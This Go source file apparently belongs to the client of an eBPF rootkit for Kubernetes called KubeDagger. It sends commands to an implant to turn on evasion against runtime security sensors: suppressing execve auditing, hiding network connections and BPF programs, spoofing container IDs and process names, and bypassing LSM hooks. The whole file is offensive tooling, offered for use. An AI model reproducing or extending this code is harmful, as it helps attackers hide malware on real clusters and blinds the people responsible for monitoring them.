package evasion

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type EvasionResult struct {
	Mode    string              `json:"mode"`
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Enable(target, mode, output string) error {
	var result *EvasionResult

	switch mode {
	case "cnative-sensor":
		result = enableCnativeSensorEvasion(target)
	case "cnative-probe":
		result = enableCnativeProbeEvasion(target)
	case "cnative-shield":
		result = enableCnativeShieldEvasion(target)
	case "all":
		result = enableAllEvasion(target)
	default:
		return fmt.Errorf("unsupported mode: %s (use cnative-sensor, cnative-probe, cnative-shield, or all)", mode)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func enableCnativeSensorEvasion(target string) *EvasionResult {
	result := &EvasionResult{Mode: "cnative-sensor"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"suppress_execve_audit",
			"filter execve events for rootkit processes in tracepoint handler",
			"cnative_sensor_suppress_execve",
		},
		{
			"hide_network_connections",
			"mask /proc/net/tcp entries from cnative-sensor's proc scanner",
			"cnative_sensor_hide_netconn",
		},
		{
			"spoof_container_id",
			"rewrite cgroup ID in syscall responses to appear as system container",
			"cnative_sensor_spoof_cgroup",
		},
	}

	for _, a := range actions {
		status := shared.SendCommand(target, "/enable_evasion", a.cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)
	return result
}

func enableCnativeProbeEvasion(target string) *EvasionResult {
	result := &EvasionResult{Mode: "cnative-probe"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"rename_process_comm",
			"modify task->comm to mimic kube-proxy or containerd-shim",
			"cnative_probe_rename_comm",
		},
		{
			"hide_bpf_programs",
			"filter BPF program list queries to hide rootkit programs",
			"cnative_probe_hide_bpf",
		},
		{
			"suppress_kprobe_events",
			"prevent cnative-probe kprobes from seeing rootkit syscalls",
			"cnative_probe_suppress_kprobe",
		},
	}

	for _, a := range actions {
		status := shared.SendCommand(target, "/enable_evasion", a.cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)
	return result
}

func enableCnativeShieldEvasion(target string) *EvasionResult {
	result := &EvasionResult{Mode: "cnative-shield"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"kernel_space_operations",
			"operate from eBPF/kernel space to bypass userspace LSM hooks",
			"cnative_shield_kernel_ops",
		},
		{
			"spoof_process_context",
			"mask process metadata to appear as allowed workload",
			"cnative_shield_spoof_proc",
		},
	}

	for _, a := range actions {
		status := shared.SendCommand(target, "/enable_evasion", a.cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)
	return result
}

func enableAllEvasion(target string) *EvasionResult {
	result := &EvasionResult{Mode: "all"}

	sensor := enableCnativeSensorEvasion(target)
	probe := enableCnativeProbeEvasion(target)
	shield := enableCnativeShieldEvasion(target)

	result.Actions = append(result.Actions, sensor.Actions...)
	result.Actions = append(result.Actions, probe.Actions...)
	result.Actions = append(result.Actions, shield.Actions...)
	result.Success = shared.AllSucceeded(result.Actions)

	return result
}
